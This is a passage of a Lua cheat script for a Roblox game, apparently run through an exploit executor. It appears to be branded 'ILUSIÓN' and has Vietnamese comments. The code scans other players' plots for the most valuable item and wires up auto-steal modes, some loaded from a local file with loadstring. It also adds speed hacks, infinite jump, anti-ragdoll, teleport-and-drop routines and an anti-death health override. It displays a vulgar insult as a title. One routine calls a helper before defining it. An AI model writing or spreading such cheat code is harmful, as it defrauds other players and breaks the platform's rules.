 for _, lab in ipairs(bb:GetDescendants()) do
 if lab:IsA("TextLabel") then
 local v = parseGenValue(lab.Text)
 if v > val then val = v end
 end
 end
 end
 end
 end
 if val > bestVal or (val == bestVal and bestVal < 0) then
 bestVal = val
 bestPrompt = d
 bestPart = basePart
 elseif bestPrompt == nil then
 bestVal = val
 bestPrompt = d
 bestPart = basePart
 end
	end

	for _, root in ipairs(roots) do
 if root == workspace then
 -- limit scan
 for _, d in ipairs(workspace:GetDescendants()) do
 if d:IsA("ProximityPrompt") then consider(d) end
 end
 else
 for _, plot in ipairs(root:GetChildren()) do
 if not isOwnPlot(plot) then
 for _, d in ipairs(plot:GetDescendants()) do
 consider(d)
 end
 end
 end
 end
	end
	return bestPart, bestVal, bestPrompt
end

function equipFlyingCarpet(char)
	char = char or LP.Character
	if not char then return false end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return false end
	local names = {
 "Flying Carpet", "Carpet", "Cloud", "Witch's Broom",
 "Magic Carpet", "Fly Carpet", "FlyingCarpet",
	}
	for _, n in ipairs(names) do
 local g = char:FindFirstChild(n) or LP.Backpack:FindFirstChild(n)
 if g and g:IsA("Tool") then
 pcall(function() hum:EquipTool(g) end)
 return true
 end
	end
	-- fuzzy
	for _, t in ipairs(LP.Backpack:GetChildren()) do
 if t:IsA("Tool") then
 local ln = t.Name:lower()
 if ln:find("carpet") or ln:find("broom") or ln:find("cloud") or ln:find("fly") then
 pcall(function() hum:EquipTool(t) end)
 return true
 end
 end
	end
	for _, t in ipairs(char:GetChildren()) do
 if t:IsA("Tool") then
 local ln = t.Name:lower()
 if ln:find("carpet") or ln:find("broom") or ln:find("cloud") then
 return true
 end
 end
	end
	return false
end

local tpBestBusy = false
function tpToBestChilli()
	-- removed per request
end
_G.IlusionTpToBest = tpToBestChilli

-- UI: button on Panel + mobile + keybind
St.keys.TpBest = St.keys.TpBest or Enum.KeyCode.B

task.defer(function()
	local pagePanel = pages and pages["Panel"]
	if pagePanel then
 section(pagePanel, "* — PANEL TP", 10)
 -- TP BEST removed
	-- actionBtn panel removed
 local info = row(pagePanel, 44, 12)
 local t = Instance.new("TextLabel")
 t.Size = UDim2.new(1, -10, 1, 0)
 t.Position = UDim2.new(0, 6, 0, 0)
 t.BackgroundTransparency = 1
 t.Text = "Infinite Jump Hold/Manual — BloodHounds"
 t.TextColor3 = C.textDim
 t.TextSize = 10
 t.Font = Enum.Font.Gotham
 t.TextXAlignment = Enum.TextXAlignment.Left
 t.Parent = info
	end
	-- also on Player for easy test
	if pagePlayer then
 section(pagePlayer, "* — INFINITE JUMP", 40)
 -- TP BEST removed
	end
end)

-- Mobile external button
task.defer(function()
	local g = Instance.new("ScreenGui")
	g.Name = "IlusionTpBestBtn"
	g.Enabled = false -- removed TP BEST
	g.ResetOnSpawn = false
	g.IgnoreGuiInset = true
	g.DisplayOrder = 1003
	g.Parent = PlayerGui
	local b = Instance.new("TextButton")
	b.Size = UDim2.new(0, 110, 0, 36)
	b.Position = UDim2.new(0.5, -55, 0, 12)
	b.BackgroundColor3 = Color3.fromRGB(20, 40, 30)
	b.Text = "INF JUMP"
	b.TextColor3 = Color3.fromRGB(120, 255, 160)
	b.Font = Enum.Font.GothamBlack
	b.TextSize = 13
	b.Parent = g
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
	local s = Instance.new("UIStroke", b)
	s.Color = Color3.fromRGB(80, 220, 120)
	s.Thickness = 1.5
	b.MouseButton1Click:Connect(tpToBestChilli)
	-- drag
	do
 local dragging, dragStart, startPos, moved
 b.InputBegan:Connect(function(input)
 if St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 moved = false
 dragStart = input.Position
 startPos = b.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then dragging = false end
 end)
 end
 end)
 UIS.InputChanged:Connect(function(input)
 if not dragging or St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - dragStart
 if math.abs(d.X) > 4 or math.abs(d.Y) > 4 then moved = true end
 if moved then
 b.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end
 end)
	end
end)

-- TP Best keybind removed



----------------------------------------------------------------
-- OVERHEAD: real speed + discord (from ILUSIÓN)
----------------------------------------------------------------
local overheadGui, overheadSpeedLabel
function setupOverheadInfo(char)
	char = char or LP.Character
	if not char then return end
	local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 5)
	if not head then
 -- fallback HRP
 head = char:FindFirstChild("HumanoidRootPart")
 if not head then return end
	end
	pcall(function()
 local old = head:FindFirstChild("IlusionOverheadInfo")
 if old then old:Destroy() end
	end)
	if overheadGui then pcall(function() overheadGui:Destroy() end) end
	overheadGui = Instance.new("BillboardGui")
	overheadGui.Name = "IlusionOverheadInfo"
	overheadGui.Size = UDim2.new(0, 300, 0, 96)
	overheadGui.StudsOffset = Vector3.new(0, 2.8, 0)
	overheadGui.AlwaysOnTop = true
	overheadGui.MaxDistance = 200
	overheadGui.LightInfluence = 0
	overheadGui.Adornee = head
	overheadGui.Parent = head
	local titleLbl = Instance.new("TextLabel")
	titleLbl.Size = UDim2.new(1, 0, 0, 22)
	titleLbl.Position = UDim2.new(0, 0, 0, 0)
	titleLbl.BackgroundTransparency = 1
	titleLbl.Text = "Free Sell La Tuat Ngu Lon"
	titleLbl.TextColor3 = Color3.fromRGB(255, 220, 100)
	titleLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	titleLbl.TextStrokeTransparency = 0
	titleLbl.Font = Enum.Font.Bangers
	titleLbl.TextSize = 17
	titleLbl.Parent = overheadGui
	local discordLbl = Instance.new("TextLabel")
	discordLbl.Size = UDim2.new(1, 0, 0, 20)
	discordLbl.Position = UDim2.new(0, 0, 0, 22)
	discordLbl.BackgroundTransparency = 1
	discordLbl.Text = ""
	discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	discordLbl.TextStrokeTransparency = 0
	discordLbl.Font = Enum.Font.Bangers
	discordLbl.TextSize = 16
	discordLbl.Parent = overheadGui
	overheadSpeedLabel = Instance.new("TextLabel")
	overheadSpeedLabel.Size = UDim2.new(1, 0, 0, 22)
	overheadSpeedLabel.Position = UDim2.new(0, 0, 0, 44)
	overheadSpeedLabel.BackgroundTransparency = 1
	overheadSpeedLabel.Text = "Speed: 0.0"
	overheadSpeedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	overheadSpeedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
	overheadSpeedLabel.TextStrokeTransparency = 0
	overheadSpeedLabel.Font = Enum.Font.Bangers
	overheadSpeedLabel.TextSize = 18
	overheadSpeedLabel.Parent = overheadGui
end
if not _G._VisOverheadLoop then
	_G._VisOverheadLoop = true
	LP.CharacterAdded:Connect(function(ch)
 task.wait(0.5)
 setupOverheadInfo(ch)
	end)
	if LP.Character then task.defer(function() setupOverheadInfo(LP.Character) end) end
	RS.RenderStepped:Connect(function()
 if not overheadSpeedLabel then return end
 local char = LP.Character
 local root = char and char:FindFirstChild("HumanoidRootPart")
 if not root then return end
 local v = root.AssemblyLinearVelocity
 local actual = Vector3.new(v.X, 0, v.Z).Magnitude
 local target = 0
 pcall(function() target = getActiveMoveSpeed() end)
 if St.speedOn and target > 0 then
 overheadSpeedLabel.Text = string.format("Speed: %.0f (%.0f)", target, actual)
 else
 overheadSpeedLabel.Text = string.format("Speed: %.1f", actual)
 end
	end)
end


print("[ILUSIÓN] TP TO BEST (Chilli) ready | key B | nut TP BEST")



-- ============================================================
-- LOAD FULL VIS AUTO STEAL (V1 / Semi V1-V2 / V3)
-- ============================================================
_G.IlusionStealPause = (St.stealPause == true)
task.spawn(function()
	local src
	pcall(function()
 if readfile and isfile and isfile("Ilusion_Auto_Steal_Embedded.lua") then
 src = readfile("Ilusion_Auto_Steal_Embedded.lua")
 end
	end)
	-- fallback: try workspace artifact path won't work in-game; embed minimal wire
	if not src then
 -- Use already-defined setAutoSteal in this file; boost by calling Vis setups if present
 warn("[Vis] AutoSteal embed not found via readfile — using internal + global hooks")
	else
 local fn, err = loadstring(src)
 if fn then
 pcall(fn)
 print("[Vis] AutoSteal full loaded")
 else
 warn("[Vis] AutoSteal load err", err)
 end
	end
	-- Wire toggles to Ace sync
	local function syncSteal()
 _G.IlusionStealPause = (St.stealPause == true)
 autoStealEnabled = St.autoSteal == true
 _G.autoStealEnabled = autoStealEnabled
 if St.stealVer == "V1" then
 selectedStealMode = "Normal"
 elseif St.stealVer == "V2" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V1"
 elseif St.stealVer == "V3" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V2"
 end
 autoStealRadius = tonumber(St.stealRadius) or 60
 autoStealV1PausePercent = tonumber(St.stealPausePct) or 75
 if _G.__AceSetupNormalAutoSteal then pcall(_G.__AceSetupNormalAutoSteal) end
 if _G.__AceSetupSemiAutoSteal then pcall(_G.__AceSetupSemiAutoSteal) end
 if autoStealEnabled then
 if selectedStealMode == "Normal" or selectedStealMode == "V1" then
 if _G.AceNormalAutoStealStart then pcall(_G.AceNormalAutoStealStart) end
 else
 if _G.AceSemiAutoStealStart then pcall(_G.AceSemiAutoStealStart) end
 end
 else
 if _G.AceNormalAutoStealStop then pcall(_G.AceNormalAutoStealStop) end
 if _G.AceSemiAutoStealStop then pcall(_G.AceSemiAutoStealStop) end
 end
 if _G.AceAutoStealSync then pcall(_G.AceAutoStealSync) end
	end
	_G.IlusionSyncAutoSteal = syncSteal
	-- override setAutoSteal (giữ bar + refresh nút mobile)
	local _oldSet = setAutoSteal
	setAutoSteal = function(on)
 St.autoSteal = on and true or false
 autoStealEnabled = St.autoSteal
 if St.autoSteal then
 if type(startAutoSteal) == "function" then pcall(startAutoSteal) end
 else
 if type(stopAutoSteal) == "function" then pcall(stopAutoSteal) end
 end
 syncSteal()
 if _G.IlusionRefreshStealBtn then pcall(_G.IlusionRefreshStealBtn) end
 if ToggleRefs and ToggleRefs.autoSteal and ToggleRefs.autoSteal.setVisual then
 pcall(ToggleRefs.autoSteal.setVisual, St.autoSteal == true)
 end
 saveCfg()
	end
end)

-- Wallpaper list (ILUSIÓN style)
local VIS_WALLS = {
	-- Empire BG only
	"rbxassetid://126832513729779","rbxassetid://81347949983999","rbxassetid://76940707345653",
	"rbxassetid://100648743625857","rbxassetid://73857705647948","rbxassetid://86237559415852",
	"rbxassetid://81474116937197","rbxassetid://86668822094069","rbxassetid://108384375206363",
	"rbxassetid://86791880986403","rbxassetid://126414648469223",
}
St.wallIndex = math.clamp(tonumber(St.wallIndex) or 1, 1, math.max(1, #VIS_WALLS))
task.defer(function()
	if not pageSet then return end
	section(pageSet, "* — WALLPAPER", 25)
	local wr = row(pageSet, 40, 28)
	local img = Instance.new("ImageLabel")
	img.Size = UDim2.new(0, 56, 0, 32)
	img.Position = UDim2.new(0, 8, 0.5, -16)
	img.BackgroundColor3 = C.box
	img.ScaleType = Enum.ScaleType.Crop
	img.Image = VIS_WALLS[St.wallIndex] or VIS_WALLS[1]
	img.ZIndex = 2
	img.Parent = wr
	Instance.new("UICorner", img).CornerRadius = UDim.new(0, 6)
	local idxLbl = Instance.new("TextLabel")
	idxLbl.Size = UDim2.new(0, 48, 0, 20)
	idxLbl.Position = UDim2.new(0, 70, 0.5, -10)
	idxLbl.BackgroundTransparency = 1
	idxLbl.Text = "#" .. tostring(St.wallIndex) .. "/" .. tostring(#VIS_WALLS)
	idxLbl.TextColor3 = C.textDim
	idxLbl.Font = Enum.Font.GothamBold
	idxLbl.TextSize = 11
	idxLbl.ZIndex = 2
	idxLbl.Parent = wr
	local function applyWall()
 local n = #VIS_WALLS
 if n < 1 then return end
 St.wallIndex = ((tonumber(St.wallIndex) or 1) - 1) % n + 1
 local asset = VIS_WALLS[St.wallIndex]
 img.Image = asset
 idxLbl.Text = "#" .. tostring(St.wallIndex) .. "/" .. tostring(n)
 local bg = Main:FindFirstChild("WallBG")
 if not bg then
 bg = Instance.new("ImageLabel")
 bg.Name = "WallBG"
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.Position = UDim2.new(0, 0, 0, 0)
 bg.BackgroundTransparency = 1
 bg.ScaleType = Enum.ScaleType.Crop
 bg.ZIndex = 0
 bg.Active = false
 bg.Selectable = false
 bg.ZIndex = 0
 bg.Parent = Main
 -- dim overlay for deeper look while keeping UI clickable
 local dim = Instance.new("Frame")
 dim.Name = "WallDim"
 dim.Size = UDim2.new(1, 0, 1, 0)
 dim.BackgroundColor3 = Color3.new(0, 0, 0)
 dim.BackgroundTransparency = 0.45
 dim.BorderSizePixel = 0
 dim.ZIndex = 0
 dim.Active = false
 dim.Selectable = false
 dim.Parent = Main
 Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 12)
 for _, ch in ipairs(Main:GetChildren()) do
 if ch ~= bg and ch.Name ~= "WallDim" and ch:IsA("GuiObject") then
 if ch.ZIndex < 2 then ch.ZIndex = 2 end
 end
 end
 end
 bg.Image = asset
 bg.ImageTransparency = math.clamp(tonumber(St.wallOpacity) or 0.12, 0, 0.85)
 bg.Active = false
 bg.Selectable = false
 bg.ScaleType = Enum.ScaleType.Crop
 bg.Visible = true
 Main.BackgroundTransparency = 0.55
 saveCfg()
	end
	applyWall()
	for i, sign in ipairs({"-", "+"}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 30, 0, 28)
 b.Position = UDim2.new(1, -72 + (i-1)*34, 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = sign
 b.TextColor3 = C.text
 b.Font = Enum.Font.GothamBold
 b.TextSize = 16
 b.AutoButtonColor = true
 b.Active = true
 b.ZIndex = 3
 b.Parent = wr
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 local function step()
 local n = #VIS_WALLS
 if n < 1 then return end
 St.wallIndex = (tonumber(St.wallIndex) or 1) + (sign == "+" and 1 or -1)
 if St.wallIndex < 1 then St.wallIndex = n end
 if St.wallIndex > n then St.wallIndex = 1 end
 applyWall()
 end
 b.MouseButton1Click:Connect(step)
 b.Activated:Connect(step)
	end
	-- V3 mode button in auto steal section
	if pagePlayer then
 -- add V3 option note via reusing stealVer
	end
end)

-- Mini = circle combat when closed
task.defer(function()
	local miniGui = PlayerGui:FindFirstChild("IlusionFullMini")
	local mini = miniGui and miniGui:FindFirstChildWhichIsA("TextButton")
	if mini then
 mini.Size = UDim2.new(0, 110, 0, 36)
 mini.Text = "ILUSIÓN"
 mini.TextSize = 22
 local c0 = mini:FindFirstChildOfClass("UICorner")
 if c0 then c0.CornerRadius = UDim.new(0, 8) end
	end
	-- Title bar rectangle text
	local mainGui = PlayerGui:FindFirstChild("IlusionFullMenu")
	local main = mainGui and mainGui:FindFirstChild("Main")
	if main then
 local top = main:FindFirstChild("TopBar") or main:FindFirstChildWhichIsA("Frame")
 if top then
 for _, x in ipairs(top:GetDescendants()) do
 if x:IsA("TextLabel") and (x.Text:find("VIS") or x.Text:find("Vis")) then
 x.Text = "Free Sell La Tuat Ngu Lon"
 end
 end
 end
	end
end)

-- Watchdog: nếu toggle ON mà logic chết → ON lại
if not _G._VisLogicWatchdog then
	_G._VisLogicWatchdog = true
	task.spawn(function()
 while true do
 task.wait(8)
 pcall(function()
 if St.speedOn then
 local alive = false
 if speedConnection then pcall(function() alive = speedConnection.Connected == true end) end
 if not alive and startSpeedBoost then
 speedConnection = nil
 startSpeedBoost()
 end
 end
 if St.infJump and InfJumpState and not InfJumpState.enabled then
 if startInfJump then startInfJump() end
 end
 if St.antiRagdoll and AntiRagdollV2 and not AntiRagdollV2.Enabled then
 if startAntiRagdoll then startAntiRagdoll() end
 end
 if St.autoSteal and _G.IlusionSyncAutoSteal then
 pcall(_G.IlusionSyncAutoSteal)
 end
 end)
 end
	end)
end

print("[ILUSIÓN] Speed | InfJump | AutoSteal | Control")


-- Auto-save ALL settings every 3s — mọi vị trí + trạng thái đóng/mở + sizes (không bỏ sót)
task.spawn(function()
	while task.wait(3) do
 pcall(function()
 -- Main menu
 if Main and Main.Parent then
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 St.menuOpen = Main.Visible == true
 end
 -- Mini open button
 local miniGui = PlayerGui:FindFirstChild("IlusionFullMini")
 local mini = miniGui and miniGui:FindFirstChildWhichIsA("TextButton")
 if mini then
 St._miniPos = {mini.Position.X.Scale, mini.Position.X.Offset, mini.Position.Y.Scale, mini.Position.Y.Offset}
 end
 -- Mode bar
 local mb = PlayerGui:FindFirstChild("IlusionModeBar")
 if mb then
 local f = mb:FindFirstChildWhichIsA("Frame")
 if f then
 St._modeBarPos = {f.Position.X.Scale, f.Position.X.Offset, f.Position.Y.Scale, f.Position.Y.Offset}
 end
 end
 -- Action + Mode buttons: lưu POSITION của Frame holder (A_* / M_*), không phải TextButton
 St._btnPos = St._btnPos or {}
 local function snapHolders(gui)
 if not gui then return end
 for _, holder in ipairs(gui:GetChildren()) do
 if holder:IsA("Frame") or holder:IsA("TextButton") then
 local key = holder.Name
 if key and (key:sub(1,2) == "A_" or key:sub(1,2) == "M_") then
 St._btnPos[key] = {
 holder.Position.X.Scale, holder.Position.X.Offset,
 holder.Position.Y.Scale, holder.Position.Y.Offset,
 holder.Size.X.Offset, holder.Size.Y.Offset
 }
 end
 end
 end
 end
 snapHolders(PlayerGui:FindFirstChild("IlusionActionButtons"))
 snapHolders(PlayerGui:FindFirstChild("IlusionModeBar"))
 -- Panel TP
 local tp = PlayerGui:FindFirstChild("IlusionbTP")
 if tp then
 local m = tp:FindFirstChild("TPMain")
 if m then
 St._tpMainPos = {m.Position.X.Scale, m.Position.X.Offset, m.Position.Y.Scale, m.Position.Y.Offset}
 St._tpMinimized = (m.Size.Y.Offset or 0) < 120
 end
 end
 -- Auto Steal floating GUI pos if any
 local asg = PlayerGui:FindFirstChild("IlusionAutoStealGui")
 if asg then
 local mf = asg:FindFirstChildWhichIsA("Frame")
 if mf then
 St._stealGuiPos = {mf.Position.X.Scale, mf.Position.X.Offset, mf.Position.Y.Scale, mf.Position.Y.Offset}
 end
 end
 saveCfg() -- dump toàn bộ St
 end)
	end
end)

-- restore positions on load
task.defer(function()
	pcall(function()
 if St._mainPos and Main then
 Main.Position = UDim2.new(St._mainPos[1], St._mainPos[2], St._mainPos[3], St._mainPos[4])
 end
 local miniGui = PlayerGui:FindFirstChild("IlusionFullMini")
 local mini = miniGui and miniGui:FindFirstChildWhichIsA("TextButton")
 if mini and St._miniPos then
 mini.Position = UDim2.new(St._miniPos[1], St._miniPos[2], St._miniPos[3], St._miniPos[4])
 end
	end)
end)

task.defer(function()
	if St.menuOpen == false then
 pcall(function()
 Main.Visible = false
 Mini.Visible = true
 end)
	end
end)

task.defer(function()
	if not pageSet then return end
	section(pageSet, "* — SENTRY BUTTON SIZE", 28)
	local sr = row(pageSet, 36, 29)
	local lbl = Instance.new("TextLabel")
	lbl.Size = UDim2.new(0.5, 0, 1, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = "Sentry size"
	lbl.TextColor3 = C.text
	lbl.Font = Enum.Font.Gotham
	lbl.TextSize = 12
	lbl.TextXAlignment = Enum.TextXAlignment.Left
	lbl.Position = UDim2.new(0, 8, 0, 0)
	lbl.Parent = sr
	local val = Instance.new("TextLabel")
	val.Size = UDim2.new(0, 40, 1, 0)
	val.Position = UDim2.new(1, -110, 0, 0)
	val.BackgroundTransparency = 1
	val.Text = tostring(St.btnSizes.sentry or 50)
	val.TextColor3 = C.textDim
	val.Font = Enum.Font.GothamBold
	val.Parent = sr
	for i, sign in ipairs({"-", "+"}) do
 local b = Instance.new("TextButton")
 b.Size = UDim2.new(0, 28, 0, 28)
 b.Position = UDim2.new(1, -70 + (i-1)*32, 0.5, -14)
 b.BackgroundColor3 = C.box
 b.Text = sign
 b.TextColor3 = C.text
 b.Font = Enum.Font.GothamBold
 b.Parent = sr
 Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
 b.MouseButton1Click:Connect(function()
 local cur = tonumber(St.btnSizes.sentry) or 50
 cur = math.clamp(cur + (sign == "+" and 5 or -5), 20, 200)
 St.btnSizes.sentry = cur
 val.Text = tostring(cur)
 if _G.IlusionUpdateMobileVisuals then
 pcall(_G.IlusionUpdateMobileVisuals)
 elseif _G.IlusionApplyMobile then
 pcall(_G.IlusionApplyMobile)
 end
 saveCfg()
 end)
	end
end)


-- ============================================================
-- PANEL TP STANDALONE (compact + rainbow border + markers)
-- ============================================================
task.spawn(function()
	local SAVE_BASE, SAVE_PET = nil, nil
	local function toVec(t)
 if typeof(t) == "Vector3" then return t end
 if type(t) == "table" then
 local x,y,z = tonumber(t[1]) or tonumber(t.X), tonumber(t[2]) or tonumber(t.Y), tonumber(t[3]) or tonumber(t.Z)
 if x and y and z then return Vector3.new(x,y,z) end
 end
 return nil
	end
	-- No nhớ base/pet giữa session — chỉ panel position
	SAVE_BASE = nil
	SAVE_PET = nil
	St._saveBase = nil
	St._savePet = nil
	print("[TP] base/pet memory disabled (panel pos only)")
	local DELAY_BASE = tonumber(St._delayBase) or 0.15
	local DELAY_PET = tonumber(St._delayPet) or 0.15
	local KEYBIND_TP = Enum.KeyCode.X
	St._keyTP = "X"
	local IS_TPING, panelLocked, MINIMIZE = false, false, St._tpMinimized == true
	local MARK_BASE, MARK_PET = nil, nil

	local function Marker(pos, col)
 local p = Instance.new("Part")
 p.Name = "IlusionTP_Marker"
 p.Shape = Enum.PartType.Cylinder
 p.Size = Vector3.new(0.35, 4, 4)
 p.CFrame = CFrame.new(pos + Vector3.new(0, 0.2, 0)) * CFrame.Angles(0, 0, math.rad(90))
 p.Anchored = true
 p.CanCollide = false
 p.Material = Enum.Material.Neon
 p.Color = col
 p.Transparency = 0.15
 p.Parent = workspace
 -- ring spin light
 local light = Instance.new("PointLight", p)
 light.Color = col
 light.Brightness = 2
 light.Range = 10
 return p
	end
	local function clearMark(m)
 if m then pcall(function() m:Destroy() end) end
	end

	local function SmoothTP(hrp, pos)
 if not hrp or not pos then return end
 pcall(function()
 hrp.AssemblyLinearVelocity = Vector3.zero
 hrp.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
 end)
	end
	local _chilliAntiDieToken = 0
	local function enableChilliAntiDie(hum, char, duration)
	    if not hum or not char then return function() end end
	    _chilliAntiDieToken = _chilliAntiDieToken + 1
	    local myToken = _chilliAntiDieToken
	    local conns = {}
	
	    pcall(function()
	        hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
	    end)
	
	    table.insert(conns, hum:GetPropertyChangedSignal("Health"):Connect(function()
	        if myToken ~= _chilliAntiDieToken then return end
	        if hum and hum.Parent and hum.Health < hum.MaxHealth then
	            pcall(function() hum.Health = hum.MaxHealth end)
	        end
	    end))
	
	    local function onDied()
	        if myToken ~= _chilliAntiDieToken then return end
	        task.defer(function()
	            if myToken ~= _chilliAntiDieToken then return end
	            if hum and hum.Parent then
	                pcall(function()
	                    hum.Health = hum.MaxHealth
	                    hum:ChangeState(Enum.HumanoidStateType.Running)
	                end)
	            end
	        end)
	    end
	    table.insert(conns, hum.Died:Connect(onDied))
	
	    pcall(function()
	        if char:GetAttribute("BreakJoints") ~= nil then
	            char:SetAttribute("BreakJoints", false)
	        end
	    end)
	
	    local function disable()
	        if myToken ~= _chilliAntiDieToken then return end
	        _chilliAntiDieToken = _chilliAntiDieToken + 1
	        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
	        pcall(function()
	            if hum and hum.Parent then
	                hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
	            end
	        end)
	    end
	
	    if duration and duration > 0 then
	        task.delay(duration, disable)
	    end
	    return disable
	end
	
	local function getLandPos(targetPos, char, hrp, hum)
	    local landY = targetPos.Y
	    pcall(function()
	        local ignore = {char}
	        for _, p in ipairs(workspace:GetChildren()) do
	            if p.Name == "SavePoint" then table.insert(ignore, p) end
	        end
	        local rayParams = RaycastParams.new()
	        rayParams.FilterDescendantsInstances = ignore
	        rayParams.FilterType = Enum.RaycastFilterType.Exclude
	        local origin = Vector3.new(targetPos.X, math.max(targetPos.Y, 0) + 100, targetPos.Z)
	        local hit = workspace:Raycast(origin, Vector3.new(0, -400, 0), rayParams)
	        if hit then
	            local offset = (hum and hum.HipHeight or 2) + ((hrp and hrp.Size.Y or 2) / 2)
	            landY = hit.Position.Y + offset
	        end
	    end)
	    return Vector3.new(targetPos.X, landY, targetPos.Z)
	end
	
	
	local function ChilliDrop(hrp, targetPos, char)
    if not hrp or not targetPos then return end
    char = char or LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return end

    enableChilliAntiDie(hum, char, 1.2)
    pcall(function() hum.Health = hum.MaxHealth end)

    EquipFly(char)
    task.wait(0.02)

    local function stopVel()
        pcall(function()
            hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero
        end)
    end

    -- 1) NHẤC BỔNG NHANH (Ace drop ascend rút ngắn)
    local ASCEND_DUR = 0.08
    local ASCEND_SPD = 180
    local t0 = tick()
    while tick() - t0 < ASCEND_DUR do
        if not hrp or not hrp.Parent then return end
        pcall(function()
            local v = hrp.AssemblyLinearVelocity
            hrp.AssemblyLinearVelocity = Vector3.new(v.X, ASCEND_SPD, v.Z)
        end)
        RS.Heartbeat:Wait()
    end

    -- 2) BAY THẲNG QUA điểm save (CFrame 1 lần, cao vừa để drop nhanh)
    local airY = targetPos.Y + 16
    stopVel()
    pcall(function()
        hrp.CFrame = CFrame.new(targetPos.X, airY, targetPos.Z)
        hrp.AssemblyLinearVelocity = Vector3.new(0, -200, 0) -- bắt đầu đập ngay
    end)

    -- 3) DROP ĐẬP ĐẤT NGAY như Ace (raycast + snap, chờ tối đa rất ngắn)
    local landY = targetPos.Y
    pcall(function()
        local ignore = {char}
        for _, p in ipairs(workspace:GetChildren()) do
            if p.Name == "SavePoint" then table.insert(ignore, p) end
        end
        local rayParams = RaycastParams.new()
        rayParams.FilterDescendantsInstances = ignore
        rayParams.FilterType = Enum.RaycastFilterType.Exclude
        local origin = Vector3.new(targetPos.X, airY + 5, targetPos.Z)
        local hit = workspace:Raycast(origin, Vector3.new(0, -400, 0), rayParams)
        if hit then
            local offset = (hum.HipHeight or 2) + (hrp.Size.Y / 2)
            landY = hit.Position.Y + offset
        end
    end)
    local landPos = Vector3.new(targetPos.X, landY, targetPos.Z)

    -- Chỉ chờ 1–2 frame rơi rồi snap (nhanh như Ace drop)
    local fallT = tick()
    while tick() - fallT < 0.10 do
        if not hrp or not hrp.Parent then break end
        if hrp.Position.Y <= landY + 6 then break end
        pcall(function()
            hrp.AssemblyLinearVelocity = Vector3.new(0, -220, 0)
        end)
        RS.Heartbeat:Wait()
    end

    pcall(function()
        hrp.CFrame = CFrame.new(landPos)
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
    end)
    stopVel()

    pcall(function()
        hum.Sit = false
        hum.PlatformStand = false
        hum.AutoRotate = true
        hum.Health = hum.MaxHealth
        hum:ChangeState(Enum.HumanoidStateType.Running)
    end)
    pcall(function()
        local cam = workspace.CurrentCamera
        local h = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if cam and h then cam.CameraSubject = h end
    end)
	end
	local function EquipFly(char)
 char = char or LP.Character
 local hum = char and char:FindFirstChildOfClass("Humanoid")
 if not hum then return end
 for _, n in ipairs({"Flying Carpet", "Carpet", "Witch's Broom", "Cloud"}) do
 local t = char:FindFirstChild(n) or LP.Backpack:FindFirstChild(n)
 if t and t:IsA("Tool") then pcall(function() hum:EquipTool(t) end) return end
 end
	end

	-- restore markers
	if SAVE_BASE then MARK_BASE = Marker(SAVE_BASE, Color3.fromRGB(255, 105, 180)) end
	if SAVE_PET then MARK_PET = Marker(SAVE_PET, Color3.fromRGB(255, 140, 0)) end

	pcall(function()
 local old = PlayerGui:FindFirstChild("IlusionbTP")
 if old then old:Destroy() end
	end)
	local gui = Instance.new("ScreenGui")
	gui.Name = "IlusionbTP"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 80
	gui.Enabled = (St.showTPPanel ~= false)
	gui.Parent = PlayerGui

	local Main = Instance.new("Frame")
	Main.Name = "TPMain"
	Main.Size = UDim2.new(0, 230, 0, 292)
	Main.Position = UDim2.new(0.02, 0, 0.28, 0)
	if type(St._tpMainPos) == "table" then
 Main.Position = UDim2.new(St._tpMainPos[1], St._tpMainPos[2], St._tpMainPos[3], St._tpMainPos[4])
	end
	Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
	Main.BorderSizePixel = 0
	Main.Active = true
	Main.ClipsDescendants = true
	Main.Parent = gui
	Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 18)

	-- White outline, matching the reference TP panel
	local stroke = Instance.new("UIStroke")
	stroke.Thickness = 2
	stroke.Color = Color3.fromRGB(255, 255, 255)
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Parent = Main

	-- header row
	local ROW = 32
	local PAD = 8
	local function y(i) return 6 + (i - 1) * (ROW + 4) end

	local LockBtn = Instance.new("TextButton", Main)
	LockBtn.Size = UDim2.new(0, 1, 0, 1)
	LockBtn.Position = UDim2.new(0, PAD, 0, y(1))
	LockBtn.BackgroundColor3 = Color3.fromRGB(32, 32, 44)
	LockBtn.Text = "UNLOCK"
